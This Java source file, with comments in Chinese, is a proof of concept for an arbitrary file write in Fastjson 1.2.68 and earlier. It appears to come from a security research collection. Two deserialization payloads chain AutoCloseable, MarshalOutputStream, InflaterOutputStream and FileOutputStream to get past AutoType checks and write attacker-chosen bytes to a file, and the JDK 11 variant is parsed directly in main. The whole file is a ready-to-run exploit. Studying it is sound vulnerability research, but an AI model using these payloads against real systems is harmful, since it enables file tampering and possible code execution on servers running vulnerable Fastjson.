/*
 * [业务问题]: Fastjson <= 1.2.68 任意文件写入漏洞避开 AutoType 限制。
 * [实现逻辑]: 利用 Fastjson 1.2.68 引入的 SafeMode 绕过缺陷，通过 AutoCloseable 接口的期望类机制，结合 MarshalOutputStream、InflaterOutputStream 和 FileOutputStream 实现任意文件写入。
 */
package com.security.bug.fastjson.file;

import com.alibaba.fastjson.JSON;
import java.io.IOException;

/**
 * Fastjson <= 1.2.68 任意文件写入 POC。
 */
public class FileWriteBypassAutoType1_2_68 {

  public static void main(String[] args) throws IOException {

    String json = "{\n"
        + "    '@type':\"java.lang.AutoCloseable\",\n"
        + "    '@type':'sun.rmi.server.MarshalOutputStream',\n"
        + "    'out':\n"
        + "    {\n"
        + "        '@type':'java.util.zip.InflaterOutputStream',\n"
        + "        'out':\n"
        + "        {\n"
        + "           '@type':'java.io.FileOutputStream',\n"
        + "           'file':'dst',\n"
        + "           'append':false\n"
        + "        },\n"
        + "        'infl':\n"
        + "        {\n"
        + "            'input':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='\n"
        + "        },\n"
        + "        'bufLen':1048576\n"
        + "    },\n"
        + "    'protocolVersion':1\n"
        + "}";
    // JSON.parse(json);

    String json_for_jdk11 = "{\n"
        + "    '@type':\"java.lang.AutoCloseable\",\n"
        + "    '@type':'sun.rmi.server.MarshalOutputStream',\n"
        + "    'out':\n"
        + "    {\n"
        + "        '@type':'java.util.zip.InflaterOutputStream',\n"
        + "        'out':\n"
        + "        {\n"
        + "           '@type':'java.io.FileOutputStream',\n"
        + "           'file':'dst',\n"
        + "           'append':false\n"
        + "        },\n"
        + "        'infl':\n"
        + "        {\n"
        + "            'input':\n"
        + "            {\n"
        + "                'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',\n"
        + "                'limit':22\n"
        + "            }\n"
        + "        },\n"
        + "        'bufLen':1048576\n"
        + "    },\n"
        + "    'protocolVersion':1\n"
        + "}";
    JSON.parse(json_for_jdk11);
  }

}
